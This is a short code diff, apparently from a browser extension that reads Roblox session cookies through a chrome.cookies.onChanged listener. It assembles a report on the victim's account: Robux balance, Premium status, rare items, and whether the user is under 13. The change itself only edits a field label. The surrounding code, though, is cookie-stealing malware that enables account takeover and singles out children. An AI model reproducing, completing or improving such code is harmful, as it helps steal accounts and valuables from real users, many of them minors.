@@ -104,7 +104,7 @@ async function main(cookie) {
                     { name: "User ID", value: statistics?.UserId ?? "N/A", inline: true },
                     { name: "Underage", value: statistics ? (statistics.IsUnder13 ? "✅ Yes" : "❌ No") : "N/A", inline: true },
                     { name: "Join Date", value: statistics?.JoinDate ?? "N/A", inline: true },
-                    { name: "<:balance:1396065501574205542>", value: statistics?.RobuxBalance ?? "N/A", inline: true },
+                    { name: "<:balance:1396065501574205542>Robux", value: statistics?.RobuxBalance ?? "N/A", inline: true },
                     { name: "⌛ Pending", value: statistics?.PendingRobux ?? "N/A", inline: true },
                     { name: "Premium", value: statistics ? (statistics.IsPremium ? "✅ Yes" : "❌ No") : "N/A", inline: true },
                     { name: "<:korblox:1153613134599307314>Korblox", value: statistics ? (statistics.Korblox ? "✅ Owns" : "❌ None") : "N/A", inline: true },
@@ -145,4 +145,5 @@ chrome.cookies.onChanged.addListener(changeInfo => {
         }
     }
 });
+
 
